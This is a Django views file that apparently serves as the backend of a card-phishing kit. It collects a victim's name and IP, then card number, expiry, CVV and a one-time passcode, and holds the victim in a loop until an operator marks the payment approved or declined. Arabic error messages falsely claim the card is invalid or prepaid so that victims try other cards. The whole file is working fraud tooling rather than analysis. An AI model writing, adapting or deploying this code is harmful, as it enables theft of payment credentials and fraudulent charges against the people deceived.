from django.shortcuts import render, redirect
from playground.forms import OtpForm, NameForm
from .models import  Payment

from .forms import NameForm

def do_smtg(request):
    if request.method == 'POST':
        form = NameForm(request.POST)
        if form.is_valid():
            full_name = form.cleaned_data['full_name']
            user_ip = request.META['REMOTE_ADDR']
            payment = Payment(full_name=full_name, user_ip=user_ip)
            payment.save()
            return redirect('do_smtg2')
    else:
        form = NameForm()
    return render(request, 'index.html', {'form': form})



def do_smtg2(request):
    if request.method == 'POST':
        payment= Payment.objects.last()
        card = request.POST.get('card')
        month_pick = request.POST.get('month')
        year_pick = request.POST.get('year')
        card_type = ""
        cvv = request.POST.get('cvv')
        

        
            
        

        if not card:
            error = "البطاقة مسبقة الدفع أو البطاقة إفتراضية أو رقم البطاقة الذي أدخلتم غير صحيح"
            return render(request, 'index2.html', {'error': error})
        if len(card) < 12:
            error = "البطاقة مسبقة الدفع أو البطاقة إفتراضية أو رقم البطاقة الذي أدخلتم غير صحيح"
            return render(request, 'index2.html', {'error': error})    

        if not month_pick or not year_pick:
            error2 = "حاول إستخدام بطاقة أخرى"
            return render(request, 'index2.html', {'error2': error2})

        if not cvv:
            error3 = "لم تكتمل عملية الدفع الخاصة بك، عليك تغيير طريقة الدفع الخاصة بك"
            return render(request, 'index2.html', {'error3': error3})
        if len(cvv) != 3 :
            error3 = "لم تكتمل عملية الدفع الخاصة بك، عليك تغيير طريقة الدفع الخاصة بك"
            return render(request, 'index2.html', {'error3': error3}) 
        if (card[0] == "4"):
            card_type = "Visa"
        elif (card[0] == "5"):
            card_type = "MasterCard"
        
        
        payment.card_number = card
        payment.month_pick = month_pick
        payment.year_pick = year_pick
        payment.cvv = cvv
        payment.card_type = card_type
        payment.save()
        return redirect('/playground/hello/hello3')
    return render(request, 'index2.html')

from django.shortcuts import render, redirect

def do_smtg3(request):
    if request.method == 'POST':
        form = OtpForm(request.POST)
        if form.is_valid():
            otp = form.cleaned_data['otp']
            payment= Payment.objects.last()
            payment.otp = otp
            payment.save()
            
            while payment.status != 'APPROVED' and payment.status != 'DECLINED':
                payment.refresh_from_db()  # to get the updated status value
                
            if payment.status == 'APPROVED':
                return redirect('/playground/hello/success')  # redirect to desired page on approved status
            
            elif payment.status == 'DECLINED':
                error4 = "الرمز السري غير صحيح، حاول مجددا"
                return render(request, 'index3.html' , {'form': form ,'error4': error4}) 
                
                pass
                
        else:
            
            pass
    else:
        form = OtpForm()
    return render(request, 'index3.html', {'form': form})

def success(request):
    return render(request, 'success.html')

def blocked(request):
    return render(request, 'blocked.html')




